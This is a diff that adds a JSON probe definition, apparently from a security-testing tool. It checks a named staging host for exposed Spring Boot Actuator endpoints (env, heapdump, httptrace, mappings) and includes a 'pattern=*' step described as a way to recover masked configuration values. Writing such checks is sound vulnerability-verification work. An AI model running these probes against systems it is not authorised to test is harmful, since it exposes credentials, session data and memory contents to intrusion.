@@ -1,0 +1,41 @@
+{
+  "name": "prove-spring-actuator-sensitive",
+  "base": "https://app.localizestaging.com",
+  "steps": [
+    {
+      "id": "actuator-env",
+      "path": "/actuator/env",
+      "expect": { "status": 200, "contains": "\"propertySources\"" },
+      "note": "Spring Boot Actuator /env exposes all configuration properties"
+    },
+    {
+      "id": "env-bypass",
+      "path": "/actuator/env?pattern=*",
+      "expect": { "status": 200, "contains": "\"propertySources\"" },
+      "note": "Bypass weak sanitization with pattern=* to recover masked values"
+    },
+    {
+      "id": "actuator-heapdump",
+      "path": "/actuator/heapdump",
+      "expect": { "status": 200 },
+      "note": "JVM heap dump endpoint — download confirms high-severity data leak"
+    },
+    {
+      "id": "actuator-httptrace",
+      "path": "/actuator/httptrace",
+      "expect": { "status": 200, "contains": "\"traces\"" },
+      "note": "Recent HTTP request trace log exposes headers, sessions, URIs"
+    },
+    {
+      "id": "actuator-mappings",
+      "path": "/actuator/mappings",
+      "expect": { "status": 200, "contains": "\"mappings\"" },
+      "note": "Full endpoint enumeration from dispatcher mappings"
+    }
+  ],
+  "impact": {
+    "step": "actuator-heapdump",
+    "contains": "JAVA PROFILE",
+    "note": "A downloadable heap dump proves sensitive runtime data exposure"
+  }
+}
